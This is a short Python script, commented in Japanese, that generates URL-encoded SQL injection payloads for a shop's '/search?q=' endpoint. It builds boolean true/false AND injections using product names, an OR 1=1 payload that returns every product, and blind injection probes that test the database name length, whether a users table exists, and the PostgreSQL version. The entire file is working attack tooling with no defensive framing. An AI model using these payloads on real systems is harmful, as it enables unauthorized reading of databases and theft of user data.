import urllib.parse

print("=== 実際に結果が出るANDインジェクション ===\n")

# 既存の商品名を使った例
existing_products = ["ノート", "スマート", "チェア", "テーブル"]

for product in existing_products:
    # True条件
    payload_true = f"{product}' AND 1=1 AND 'x'='"
    encoded_true = urllib.parse.quote(payload_true)
    
    # False条件  
    payload_false = f"{product}' AND 1=2 AND 'x'='"
    encoded_false = urllib.parse.quote(payload_false)
    
    print(f"[商品: {product}]")
    print(f"True条件:  /search?q={encoded_true}")
    print(f"False条件: /search?q={encoded_false}")
    print(f"期待結果: True条件では商品表示、False条件では結果なし")
    print("-" * 60)

print("\n=== より確実な方法: OR を使用 ===")
# OR を使えば商品名に関係なく結果が出る
or_payload = "test' OR 1=1 AND 'x'='"
or_encoded = urllib.parse.quote(or_payload)
print(f"OR条件: /search?q={or_encoded}")
print("結果: 常に全商品が表示される")

print("\n=== ブラインドSQLインジェクション例 ===")
# 実在する商品名で情報抽出
blind_payloads = [
    "ノート' AND LENGTH(database())>3 AND 'x'='",
    "ノート' AND (SELECT COUNT(*) FROM users)>0 AND 'x'='", 
    "ノート' AND version() LIKE 'PostgreSQL%' AND 'x'='",
]

for payload in blind_payloads:
    encoded = urllib.parse.quote(payload)
    print(f"テスト: /search?q={encoded}")
    
print("\n説明: 条件が真なら商品が表示され、偽なら表示されない")